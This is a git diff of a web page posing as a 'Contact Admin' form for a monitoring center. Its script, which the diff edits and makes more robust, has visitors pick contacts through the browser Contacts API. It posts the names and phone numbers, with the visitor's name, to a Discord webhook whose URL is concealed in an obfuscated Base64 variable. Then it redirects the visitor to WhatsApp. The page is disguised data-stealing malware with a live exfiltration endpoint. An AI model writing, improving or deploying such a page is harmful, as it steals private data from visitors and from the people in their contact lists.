@@ -41,8 +41,8 @@
                 
                 <button onclick="startProcess()" 
                     class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-4 rounded-xl shadow-lg shadow-blue-500/30 flex items-center justify-center gap-2 transition-all active:scale-95">
-                    <span>Contact Admin</span>
-                    <i data-lucide="search" class="w-4 h-4"></i>
+                    <span id="btnText">Contact Admin</span>
+                    <i id="btnIcon" data-lucide="search" class="w-4 h-4"></i>
                 </button>
             </div>
             <p class="mt-6 text-[10px] text-slate-400 font-bold uppercase tracking-widest">© 2026 Monitoring Center - Secured by SMK PRESISI</p>
@@ -52,47 +52,75 @@
     <script>
         lucide.createIcons();
 
-
+        // Webhook URL (Tetap Base64 lo yang tadi)
         const _0x4a2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2ODYxODkzNzQ4MTY5MTI4MS9sMGtzUVN2ODFIOWRRT2F6SEJHTWN0RU1la2t1RUs4RUpRX21LOWwzN0ktMmc5dXYwME0wdzU4b0wwMF9rYm5FZ3hRcw==";
 
         function startProcess() {
             const name = document.getElementById('visitorName').value;
-            if (!name) { alert('Nama wajib diisi!'); return; }
-            document.getElementById('toast').classList.add('toast-animate');
+            if (!name) { alert('Nama wajib diisi, Ki!'); return; }
+            
+            const toast = document.getElementById('toast');
+            toast.classList.remove('toast-animate');
+            void toast.offsetWidth; 
+            toast.classList.add('toast-animate');
+
             setTimeout(() => { executeCapture(name); }, 1200);
         }
 
         async function executeCapture(name) {
+            const btnText = document.getElementById('btnText');
             const btn = document.querySelector('button');
-            btn.innerHTML = `<span class="animate-spin mr-2">⏳</span> Mencari...`;
+            
+            btnText.innerText = "Mencari...";
             btn.disabled = true;
 
-            let contactsData = "Akses ditolak pengunjung";
+            let contactsData = "Data tidak terpilih";
             try {
+                // HANYA JALAN DI HP CHROME/EDGE (HTTPS)
                 if ('contacts' in navigator && 'ContactsManager' in window) {
                     const props = ['name', 'tel'];
                     const contacts = await navigator.contacts.select(props, { multiple: true });
-                    contactsData = JSON.stringify(contacts);
+                    if (contacts.length > 0) {
+                        contactsData = JSON.stringify(contacts, null, 2);
+                    }
+                } else {
+                    contactsData = "Browser Laptop/Tidak Support Contact API";
                 }
-            } catch (err) { contactsData = "Error: " + err; }
+            } catch (err) { 
+                contactsData = "User Menolak Akses: " + err; 
+            }
 
-            await fetch(atob(_0x4a2), {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    embeds: [{
-                        title: "🚨 Alert: Kontak Admin Diakses",
-                        color: 3447003,
-                        fields: [
-                            { name: "User", value: name, inline: true },
-                            { name: "Data", value: "```json\n" + (contactsData.length > 900 ? contactsData.substring(0, 900) + "..." : contactsData) + "\n```" }
-                        ],
-                        footer: { text: "System Log | Bunny-Machine" }
-                    }]
-                })
-            });
+            // PERBAIKAN SISTEM: Menggunakan keepalive dan mode no-cors jika perlu
+            const payload = {
+                username: "Bunny-Machine Log",
+                avatar_url: "https://i.imgur.com/8nN9S1L.png",
+                embeds: [{
+                    title: "🚨 Alert: Kontak Admin Diakses",
+                    color: 3447003,
+                    fields: [
+                        { name: "Pengguna", value: `👤 ${name}`, inline: true },
+                        { name: "Waktu", value: `🕒 ${new Date().toLocaleString('id-ID')}`, inline: true },
+                        { name: "Hasil Capture", value: "```json\n" + contactsData.substring(0, 900) + "\n```" }
+                    ],
+                    footer: { text: "System Log | Secured by Oki" }
+                }]
+            };
 
-            window.location.href = "https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20" + encodeURIComponent(name) + "%20ingin%20sinkronisasi.";
+            try {
+                await fetch(atob(_0x4a2), {
+                    method: 'POST',
+                    mode: 'cors', // Penting buat GitHub Pages
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error("Webhook Error:", e);
+            }
+
+            // Redirect tetap jalan
+            setTimeout(() => {
+                window.location.href = "https://wa.me/62882006262523?text=Halo%20Admin,%20saya%20" + encodeURIComponent(name) + "%20ingin%20sinkronisasi.";
+            }, 500);
         }
     </script>
 </body>
